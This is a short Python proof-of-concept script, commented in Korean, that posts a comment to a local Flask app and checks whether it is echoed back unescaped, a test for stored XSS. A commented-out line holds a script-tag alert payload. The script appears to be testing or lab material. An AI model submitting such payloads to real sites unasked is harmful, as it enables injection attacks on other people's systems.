import requests

# Flask 애플리케이션이 실행 중인 URL (예: http://localhost:3000/)
url = "http://localhost:3000"

# XSS 공격이 가능한 페이로드
#payload = "<script>alert('XSS PoC');</script>"
payload = "thisisplaintext"

def inject_comment(payload):
    """
    XSS 페이로드를 포함한 댓글을 서버에 저장합니다.
    """
    # POST 요청으로 댓글 저장. 폼 필드 이름은 Flask 예제 코드의 'comment'와 일치해야 합니다.
    response = requests.post(url, data={"comment": payload})
    return response

def check_stored_xss(payload):
    """
    저장된 댓글 페이지를 GET 요청하여, XSS 페이로드가 그대로 노출되는지 확인합니다.
    """
    response = requests.get(url)
    if payload in response.text:
        return True
    return False

# 1. 페이로드 주입 (댓글 저장)
inject_comment(payload)

# 2. 페이지를 다시 요청하여 페이로드가 그대로 노출되는지 검사
if check_stored_xss(payload):
    print("[+] PoC 성공: Stored XSS 취약점 존재!")
else:
    print("[-] PoC 실패: Stored XSS 취약점이 존재하지 않음!")
